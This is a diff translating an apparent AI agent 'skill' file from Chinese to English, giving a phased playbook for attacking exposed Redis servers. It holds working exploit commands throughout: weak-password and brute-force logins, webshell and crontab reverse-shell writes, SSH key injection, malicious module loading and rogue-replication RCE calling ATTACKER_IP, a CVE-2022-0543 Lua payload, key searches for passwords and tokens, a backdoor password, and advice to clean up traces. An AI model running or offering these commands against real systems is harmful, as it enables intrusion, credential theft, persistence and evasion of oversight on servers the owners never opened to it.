@@ -1,56 +1,60 @@
 ---
 name: redis-attack
-description: "Redis 未授权访问与利用。当发现目标开放 6379 端口、Redis 服务无认证或弱密码、需要从 Redis 获取敏感数据或实现远程命令执行时使用。覆盖未授权访问、数据窃取、crontab 写入 RCE、主从复制 RCE、模块加载 RCE、webshell 写入、SSH 公钥注入、Lua 脚本注入、Pub/Sub 窃听、持久化文件利用"
+description: "Redis unauthorized access and exploitation. Use when a target exposes port 6379, the Redis service has no authentication or weak credentials, or you need to extract sensitive data or achieve remote command execution through Redis. Covers unauthorized access, data theft, crontab-write RCE, replication RCE, module-load RCE, webshell writing, SSH public key injection, Lua script injection, Pub/Sub eavesdropping, and persistence file abuse"
+zh-signals: "Redis 未授权访问与利用，覆盖未授权检测、crontab/主从复制/模块加载 RCE 与数据窃取。信号:redis,6379,未授权,rce,主从复制,webshell"
+when-to-use: >-
+  Use when the target exposes Redis on port 6379, the service accepts unauthenticated
+  or weak-credential access, or you need to extract data or achieve RCE through Redis.
 metadata:
-  tags: "redis,6379,未授权,rce,主从复制,crontab,webshell,ssh-key,lua,module-load,redis-rogue-server"
+  tags: "redis,6379,unauthorized,rce,replication,crontab,webshell,ssh-key,lua,module-load,redis-rogue-server"
   category: "exploit"
 ---
 
-# Redis 未授权访问与利用
+# Redis Unauthorized Access and Exploitation
 
-Redis 默认无认证、监听 0.0.0.0，一旦暴露在网络上攻击面极大——从数据窃取到 RCE 仅需几条命令。
+Redis has no authentication by default and listens on 0.0.0.0 — once exposed to the network the attack surface is huge, since going from data theft to RCE takes only a few commands.
 
-## ⛔ 深入参考（必读）
-- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)
+## ⛔ Further Reading (Must Read)
+- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 1: 服务发现与版本识别
+## Phase 1: Service Discovery and Version Identification
 
-### 1.1 Nmap 扫描
+### 1.1 Nmap Scan
 
 ```bash
-# Redis 信息收集脚本
+# Redis information gathering script
 nmap -p 6379 --script redis-info TARGET
 
-# 版本探测
+# Version detection
 nmap -sV -p 6379 TARGET
 ```
 
-### 1.2 手动连接测试
+### 1.2 Manual Connection Test
 
 ```bash
-# PING 测试连通性
+# PING to test connectivity
 redis-cli -h TARGET -p 6379 PING
-# 返回 PONG 表示无需认证
+# A PONG response means no authentication is required
 
-# 获取服务器信息（关注 redis_version, os, config_file）
+# Fetch server information (pay attention to redis_version, os, config_file)
 redis-cli -h TARGET -p 6379 INFO server
 ```
 
-**关键判断**：
-- 返回 PONG / 正常信息 → 无认证，直接进入 Phase 3
-- 返回 `-NOAUTH Authentication required` → 需要认证，进入 Phase 2
-- 返回 `redis_version` → 确定版本，决定可用攻击路径
+**Key Decision**:
+- PONG / normal information returned → no authentication, go straight to Phase 3
+- `-NOAUTH Authentication required` returned → authentication required, go to Phase 2
+- `redis_version` returned → determine the version and decide which attack paths are available
 
 ---
 
-## Phase 2: 未授权/弱口令检测
+## Phase 2: Unauthorized / Weak Credential Detection
 
-### 2.1 常见弱口令
+### 2.1 Common Weak Credentials
 
 ```bash
-# 逐个尝试
+# Try them one by one
 redis-cli -h TARGET -p 6379 -a redis INFO server
 redis-cli -h TARGET -p 6379 -a password INFO server
 redis-cli -h TARGET -p 6379 -a 123456 INFO server
@@ -58,7 +62,7 @@ redis-cli -h TARGET -p 6379 -a admin INFO server
 redis-cli -h TARGET -p 6379 -a root INFO server
 ```
 
-### 2.2 暴力破解
+### 2.2 Brute Force
 
 ```bash
 # Hydra
@@ -73,42 +77,42 @@ medusa -h TARGET -P passwords.txt -M redis
 
 ---
 
-## Phase 3: 攻击决策树
+## Phase 3: Attack Decision Tree
 
 ```
-连接成功？
-├─ 可执行 CONFIG SET → RCE 路径
-│   ├─ 目标有 Web 服务 → webshell 写入 (Phase 4.1)
-│   ├─ 目标有 cron → crontab 反弹 shell (Phase 4.2)
-│   └─ 目标有 SSH → 写 authorized_keys (Phase 4.3)
-├─ Redis >= 4.0 → 模块加载 RCE (Phase 4.4)
-├─ Redis >= 4.0 → 主从复制 RCE / redis-rogue-server (Phase 4.5)
-├─ 可执行 KEYS/GET → 数据窃取 (Phase 5)
-│   ├─ 搜索 *password*, *token*, *session*
-│   └─ HGETALL 遍历 Hash 数据
-├─ 可执行 PSUBSCRIBE → Pub/Sub 窃听 (Phase 6)
-└─ 可执行 EVAL → Lua 脚本注入 (Phase 6)
+Connection successful?
+├─ CONFIG SET allowed → RCE path
+│   ├─ Target runs a web service → webshell write (Phase 4.1)
+│   ├─ Target runs cron → crontab reverse shell (Phase 4.2)
+│   └─ Target runs SSH → write authorized_keys (Phase 4.3)
+├─ Redis >= 4.0 → module load RCE (Phase 4.4)
+├─ Redis >= 4.0 → replication RCE / redis-rogue-server (Phase 4.5)
+├─ KEYS/GET allowed → data theft (Phase 5)
+│   ├─ Search *password*, *token*, *session*
+│   └─ HGETALL to walk Hash data
+├─ PSUBSCRIBE allowed → Pub/Sub eavesdropping (Phase 6)
+└─ EVAL allowed → Lua script injection (Phase 6)
 ```
 
-**前置信息收集**：
+**Preliminary Information Gathering**:
 
 ```bash
-# 获取当前工作目录和数据库文件名（CONFIG SET 攻击前必查）
+# Get the current working directory and database file name (must check before the CONFIG SET attack)
 redis-cli -h TARGET -p 6379 CONFIG GET dir
 redis-cli -h TARGET -p 6379 CONFIG GET dbfilename
 
-# 获取全部配置
+# Get the full configuration
 redis-cli -h TARGET -p 6379 CONFIG GET "*"
 
-# 检查 Redis 版本（决定模块加载/主从复制是否可用）
+# Check the Redis version (decides whether module load / replication is available)
 redis-cli -h TARGET -p 6379 INFO server
 ```
 
 ---
 
-## Phase 4: 快速利用命令
+## Phase 4: Quick Exploitation Commands
 
-### 4.1 Webshell 写入
+### 4.1 Webshell Write
 
 ```bash
 redis-cli -h TARGET -p 6379
@@ -118,7 +122,7 @@ redis-cli -h TARGET -p 6379
 > SAVE
 ```
 
-验证: `curl http://TARGET/shell.php`
+Verify: `curl http://TARGET/shell.php`
 
 ### 4.2 Crontab RCE
 
@@ -130,146 +134,146 @@ redis-cli -h TARGET -p 6379
 > SAVE
 ```
 
-注意: Ubuntu/Debian 路径为 `/var/spool/cron/crontabs/`，CentOS/RHEL 为 `/var/spool/cron/`。
+Note: the Ubuntu/Debian path is `/var/spool/cron/crontabs/`, while CentOS/RHEL uses `/var/spool/cron/`.
 
-### 4.3 SSH 公钥写入
+### 4.3 SSH Public Key Write
 
 ```bash
-# 生成密钥对
+# Generate the key pair
 ssh-keygen -t rsa -f /tmp/redis_rsa
 
-# 格式化公钥（前后加换行避免 Redis 数据干扰）
+# Format the public key (add newlines before and after to avoid interference from Redis data)
 (echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/spaced_key.txt
 
-# 导入并写入
+# Import and write
 cat /tmp/spaced_key.txt | redis-cli -h TARGET -p 6379 -x set ssh_key
 redis-cli -h TARGET -p 6379 CONFIG SET dir /var/lib/redis/.ssh
-# 如果 Redis 以 root 运行，改用 /root/.ssh
+# If Redis runs as root, use /root/.ssh instead
 redis-cli -h TARGET -p 6379 CONFIG SET dbfilename authorized_keys
 redis-cli -h TARGET -p 6379 SAVE
 
-# 登录
+# Login
 ssh -i /tmp/redis_rsa redis@TARGET
 ```
 
-### 4.4 模块加载 RCE (Redis >= 4.0)
+### 4.4 Module Load RCE (Redis >= 4.0)
 
 ```bash
-# 需先将恶意 .so 上传到目标（通过主从复制或其他途径）
+# The malicious .so must be uploaded to the target first (via replication or another route)
 redis-cli -h TARGET -p 6379 MODULE LOAD /path/to/module.so
 redis-cli -h TARGET -p 6379 system.exec "id"
 redis-cli -h TARGET -p 6379 system.rev ATTACKER_IP 9999
 ```
 
-### 4.5 主从复制 RCE
+### 4.5 Replication RCE
 
 ```bash
-# 自动化利用（Redis <= 5.0.5）
+# Automated exploitation (Redis <= 5.0.5)
 python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost ATTACKER_IP
 
-# 手动利用
+# Manual exploitation
 redis-cli -h TARGET -p 6379 SLAVEOF ATTACKER_IP 6379
-# 传输恶意模块后
+# After the malicious module is transferred
 redis-cli -h TARGET -p 6379 MODULE LOAD /tmp/module.so
 redis-cli -h TARGET -p 6379 system.exec "id"
-# 清理
+# Cleanup
 redis-cli -h TARGET -p 6379 MODULE UNLOAD mymodule
 redis-cli -h TARGET -p 6379 SLAVEOF NO ONE
 ```
 
-→ 更多方法与完整 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)
+→ More methods and complete payloads → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 5: 数据窃取
+## Phase 5: Data Theft
 
 ```bash
-# 列出所有键
+# List all keys
 redis-cli -h TARGET -p 6379 KEYS "*"
 
-# 搜索敏感键名
+# Search sensitive key names
 redis-cli -h TARGET -p 6379 KEYS "*password*"
 redis-cli -h TARGET -p 6379 KEYS "*secret*"
 redis-cli -h TARGET -p 6379 KEYS "*token*"
 redis-cli -h TARGET -p 6379 KEYS "*session*"
 
-# 获取值
+# Fetch values
 redis-cli -h TARGET -p 6379 GET keyname
 
-# 遍历 Hash 类型
+# Walk Hash-typed data
 redis-cli -h TARGET -p 6379 HGETALL keyname
 
-# 大数据库用 SCAN 替代 KEYS（避免阻塞）
+# Use SCAN instead of KEYS on large databases (avoids blocking)
 redis-cli -h TARGET -p 6379 SCAN 0 MATCH "*password*" COUNT 100
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整数据窃取命令
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete data theft commands
 
 ---
 
-## Phase 6: 其他攻击向量
+## Phase 6: Other Attack Vectors
 
-### 6.1 Pub/Sub 窃听
+### 6.1 Pub/Sub Eavesdropping
 
 ```bash
-# 监听所有频道
+# Subscribe to all channels
 redis-cli -h TARGET -p 6379 PSUBSCRIBE "*"
 ```
 
-### 6.2 Lua 脚本注入
+### 6.2 Lua Script Injection
 
 ```bash
-# 执行系统命令（CVE-2022-0543, Debian/Ubuntu 特有）
+# Execute system commands (CVE-2022-0543, Debian/Ubuntu specific)
 redis-cli -h TARGET -p 6379 EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
 ```
 
-### 6.3 配置篡改
+### 6.3 Configuration Tampering
 
 ```bash
-# 读取当前认证配置
+# Read the current authentication configuration
 redis-cli -h TARGET -p 6379 CONFIG GET requirepass
 redis-cli -h TARGET -p 6379 CONFIG GET masterauth
 
-# 设置后门密码
+# Set a backdoor password
 redis-cli -h TARGET -p 6379 CONFIG SET requirepass "backdoor_pass"
 ```
 
-### 6.4 持久化文件利用
+### 6.4 Persistence File Abuse
 
 ```bash
-# 触发 RDB 持久化
+# Trigger RDB persistence
 redis-cli -h TARGET -p 6379 BGSAVE
 
-# 获取持久化文件路径
+# Get the persistence file path
 redis-cli -h TARGET -p 6379 CONFIG GET dir
 redis-cli -h TARGET -p 6379 CONFIG GET dbfilename
 
-# 下载后用 rdbtools 解析
+# Download it and parse it with rdbtools
 rdb --command json /path/to/dump.rdb
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整技术细节
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete technical details
 
 ---
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| redis-cli | Redis 官方客户端 |
-| redis-rogue-server | 主从复制自动化 RCE |
-| RedisModules-ExecuteCommand | 恶意 .so 模块生成 |
-| rdbtools | RDB 持久化文件解析 |
-| hydra / medusa | Redis 密码爆破 |
-| nmap redis-info / redis-brute | Redis 信息收集与爆破脚本 |
+| redis-cli | Official Redis client |
+| redis-rogue-server | Automated replication RCE |
+| RedisModules-ExecuteCommand | Malicious .so module generation |
+| rdbtools | RDB persistence file parsing |
+| hydra / medusa | Redis password brute force |
+| nmap redis-info / redis-brute | Redis information gathering and brute-force scripts |
 
 ---
 
-## 注意事项
+## Notes
 
-- `SAVE` 操作会阻塞 Redis，可能导致服务中断；生产环境优先用 `BGSAVE`
-- `CONFIG SET` 操作被记录到 Redis 日志，注意痕迹清理
-- `KEYS *` 在大数据库上严重阻塞，生产环境用 `SCAN` 替代
-- CONFIG SET 写文件会覆盖原有 RDB 内容，操作前备份 `CONFIG GET dir` 和 `CONFIG GET dbfilename`
-- 主从复制 RCE 完成后务必执行 `SLAVEOF NO ONE` 和 `MODULE UNLOAD` 清理
-- Crontab 写入仅在目标以 root 运行 Redis 时有效
+- `SAVE` blocks Redis and may cause a service outage; prefer `BGSAVE` in production
+- `CONFIG SET` operations are logged by Redis — clean up your traces
+- `KEYS *` severely blocks large databases; use `SCAN` in production
+- A CONFIG SET file write overwrites the existing RDB content — back up `CONFIG GET dir` and `CONFIG GET dbfilename` before operating
+- Always run `SLAVEOF NO ONE` and `MODULE UNLOAD` for cleanup after replication RCE
+- Crontab writing only works when the target runs Redis as root
